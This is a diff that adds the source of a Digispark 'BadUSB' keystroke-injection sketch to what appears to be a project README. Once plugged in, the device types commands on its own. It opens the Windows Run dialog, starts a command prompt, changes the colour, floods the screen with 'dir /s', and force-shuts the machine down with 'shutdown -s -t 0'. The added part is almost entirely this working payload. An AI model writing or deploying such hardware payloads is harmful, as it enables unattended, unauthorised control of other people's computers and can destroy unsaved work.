@@ -40,3 +40,30 @@ All actions are automated and executed very quickly.
 
 
 # Code
+```bash
+#include "DigiKeyboard.h"
+
+void setup()
+{
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("CMD");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(700);
+  DigiKeyboard.print("color C");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(700);
+  DigiKeyboard.print("dir /s");  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("shutdown -s -t 0");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("EXIT");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+}
+
+void loop() { }
+```
